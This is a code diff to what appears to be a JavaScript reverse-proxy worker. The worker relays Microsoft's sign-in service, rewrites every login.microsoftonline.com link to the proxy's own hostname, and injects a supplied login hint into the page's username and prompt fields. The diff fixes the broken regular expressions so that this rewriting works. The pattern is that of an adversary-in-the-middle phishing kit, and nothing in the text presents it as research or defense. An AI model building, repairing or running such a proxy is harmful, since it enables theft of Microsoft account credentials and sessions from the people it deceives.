@@ -55,7 +55,7 @@ async function handleProxy(request, pathSegments = []) {
     upstreamPath = UPSTREAM_PATH + pathSegments.join('/');
   }
 
-  // FIX: Build upstream URL with proper query parameter handling
+  // Build upstream URL with proper query parameter handling
   const upstreamUrl = new URL(`https://${UPSTREAM}${upstreamPath}`);
   
   // Copy ALL query parameters from original request to upstream URL
@@ -120,7 +120,7 @@ async function handleProxy(request, pathSegments = []) {
     return new Response('Upstream error: ' + error.message, { status: 502 });
   }
 
-  // FIX: Enhanced redirect handling to preserve query parameters
+  // Enhanced redirect handling to preserve query parameters
   if ([301, 302, 303, 307, 308].includes(upstreamResponse.status)) {
     const location = upstreamResponse.headers.get('location');
     if (location) {
@@ -214,22 +214,23 @@ async function handleProxy(request, pathSegments = []) {
         .replace(/https:\/\/login\.microsoftonline\.com/gi, `https://${url.hostname}`)
         .replace(/http:\/\/login\.microsoftonline\.com/gi, `https://${url.hostname}`);
       
-      // FIX: Also enhance JavaScript to handle login hints if present in query params
+      // Enhanced JavaScript to handle login hints if present in query params
       const loginHint = url.searchParams.get('loginhint');
       const prompt = url.searchParams.get('prompt');
       
       if (loginHint) {
         // Replace login_hint in hidden form fields and JavaScript variables
+        // FIXED: Properly escaped regular expressions
         modifiedText = modifiedText
-          .replace(/(<input[^>]*name="login"[^>]*value=")[^"]*("/gi, `$1${loginHint}$2`)
-          .replace(/(<input[^>]*name="loginhint"[^>]*value=")[^"]*("/gi, `$1${loginHint}$2`)
+          .replace(/(<input[^>]*name="login"[^>]*value=")[^"]*(")/gi, `$1${loginHint}$2`)
+          .replace(/(<input[^>]*name="loginhint"[^>]*value=")[^"]*(")/gi, `$1${loginHint}$2`)
           .replace(/(window\.loginHint\s*=\s*["'])[^"']*(["'])/gi, `$1${loginHint}$2`)
           .replace(/(var\s+loginHint\s*=\s*["'])[^"']*(["'])/gi, `$1${loginHint}$2`);
       }
       
       if (prompt) {
         modifiedText = modifiedText
-          .replace(/(<input[^>]*name="prompt"[^>]*value=")[^"]*("/gi, `$1${prompt}$2`);
+          .replace(/(<input[^>]*name="prompt"[^>]*value=")[^"]*(")/gi, `$1${prompt}$2`);
       }
       
       responseBody = modifiedText;
